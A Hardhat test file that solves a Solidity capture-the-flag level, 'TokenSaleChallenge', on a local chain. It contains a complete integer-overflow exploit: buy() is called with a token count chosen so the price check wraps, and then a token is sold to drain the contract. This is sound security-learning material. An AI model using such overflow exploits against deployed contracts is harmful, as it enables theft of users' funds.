import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    // overflow exploit
    // msg.value == numTokens * PRICE_PER_TOKEN
    // 2^256 / 10^18 + 1 = 115792089237316195423570985008687907853269984665640564039458
    // (2^256 / 10^18 + 1) * 10^18 - 2^256 = 415992086870360064 ~= 0.41 ETH
    const buyTx = await target.buy('115792089237316195423570985008687907853269984665640564039458', {
      value: '415992086870360064',
    });
    await buyTx.wait();

    const sellTx = await target.sell(1);
    await sellTx.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
